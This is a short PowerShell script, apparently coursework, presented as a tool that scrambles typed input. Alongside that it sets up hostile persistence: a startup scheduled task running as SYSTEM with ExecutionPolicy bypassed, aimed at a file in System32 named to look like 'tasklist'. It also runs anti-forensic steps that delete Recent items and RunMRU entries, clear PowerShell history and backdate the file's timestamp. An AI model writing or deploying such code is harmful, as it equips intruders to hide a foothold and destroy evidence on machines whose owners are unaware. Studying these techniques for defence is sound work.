#Ife Adetunji CDT 473
#This is an obfuscation tool to make any command line input into gibberish

#takes an input from the host
$InputString = Read-Host ""

#assigning output string
$OutputString = ""

#for loop to obfuscate
for ($i = 0; $i -lt $InputString.Length; $i++) {
  $RandomChar = [char]([int]([char]$InputString[$i]) + Get-Random -Minimum 1 -Maximum 10)
  $OutputString += $RandomChar
}

#Writes the output to the command line
Write-Host "$OutputString"


#This part causes the script to run at startup as scheduled tasks
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"<C:\Windows\System32\taskIist.ps1>`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings

Register-ScheduledTask -TaskName "taskIist" -InputObject $Task -User "SYSTEM" -Password $null

#This hides the history of this script from the users
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Set-PSReadlineOption -MaximumHistoryCount 1
Clear-History -Count 10000

#sets the scripts last write time to an obscure time
Set-ItemProperty  "<C:\Windows\System32\taskIist.ps1>" -Name "LastWriteTime" -Value "2022-12-13 12:34:05"